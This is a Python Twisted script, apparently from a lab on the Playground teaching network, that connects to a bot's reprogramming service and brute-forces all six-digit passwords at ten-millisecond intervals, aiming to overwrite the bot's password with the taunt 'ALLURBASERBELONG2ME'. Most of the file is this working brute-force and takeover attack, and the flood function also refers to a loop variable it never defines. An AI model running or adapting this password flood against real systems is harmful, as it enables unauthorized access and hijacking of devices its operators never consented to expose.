import bot.client.ReprogrammingClientProtocol as RCP
from twisted.internet.endpoints import connectProtocol
from twisted.internet import reactor, task
from playground.twisted.endpoints.GateEndpoint import GateClientEndpoint, PlaygroundNetworkSettings
from twisted.internet.protocol import Protocol
from playground.network.common.Protocol import MessageStorage
from bot.common.network import ReprogrammingResponse, ReprogrammingRequest
from bot.common.util import InsertChecksum
from twisted.internet.defer import Deferred
import sys

class ReprogrammingClientProtocol(Protocol):
    def __init__(self):
        self.__storage = MessageStorage(ReprogrammingResponse)
        self.__requests = {}
        self.__reqId = 0
        self.responses = 0
        
    def __nextId(self):
        self.__reqId += 1
        return self.__reqId
        
    def dataReceived(self, data):
        self.__storage.update(data)
        #print "received", len(data), "bytes from", self.transport.getPeer()
        for message in self.__storage.iterateMessages():
            self.responses += 1
            if "uccessful" in data:
                print("Successful reprogram (request ID# %s)" % message.RequestId)
            #if not self.__requests.has_key(message.RequestId):
            #    continue
            #print "getting callback for requestId", message.RequestId
            #d = self.__requests[message.RequestId]
            #d.callback(message.Data)
        
    def reprogram(self, password, subsystem, data, *additionalSubsystems):
        if len(additionalSubsystems) % 2 != 0:
            raise Exception("Arguments to reprogram is both a subsystem and the data")
        req = ReprogrammingRequest(RequestId=self.__nextId(),
                                   Opcode   =0)
        
        subsystems = [subsystem]
        programs = [data]
        
        while additionalSubsystems:
            subsystems.append(additionalSubsystems.pop(0))
            programs.append(additionalSubsystems.pop(0))
            
        subsystems = map(ReprogrammingRequest.SUBSYSTEMS.index, subsystems)
    
        req.Subsystems = subsystems
        req.Data = programs
        
        InsertChecksum(req, password=password)
        #self.__requests[req.RequestId] = Deferred()
        self.transport.write(req.__serialize__())
        #return self.__requests[req.RequestId]
    
    def status(self, password, *subsystems):
        subsystems = map(ReprogrammingRequest.SUBSYSTEMS.index, subsystems)
        req = ReprogrammingRequest(RequestId =self.__nextId(),
                                   Opcode    =1,
                                   Subsystems=subsystems,
                                   Data      =[])
        InsertChecksum(req, password=password)
        #self.__requests[req.RequestId] = Deferred()
        self.transport.write(req.__serialize__())
        #return self.__requests[req.RequestId]

def pwFlood (protocol, counter):
    i = counter[0]
    if i <= 999999:
        pw = "0"*(6-len(str(i))) + str(i)
        protocol.reprogram(pw, "PASSWORD", "ALLURBASERBELONG2ME")
        counter[0] = i+1
        if i%10000 == 0:
            print("Done with %s (# responses: %s)" % (i/10000,protocol.responses))
    else:
        print("Done with flood!")
        loop.stop()

def startflood(loop):
    loop.start(0.010)

def crack(address = "2017.1.1.1"):
    counter = [0, 0]
    proto = ReprogrammingClientProtocol()
    endpt = GateClientEndpoint(reactor, address, 666, PlaygroundNetworkSettings())
    d =  connectProtocol(endpt,proto)
    loop = task.LoopingCall(pwFlood, proto, counter)
    reactor.callLater(3, startflood, loop)
    reactor.run()

if __name__ == "__main__":
    args = sys.argv[1:]
    crack(args[0] or None)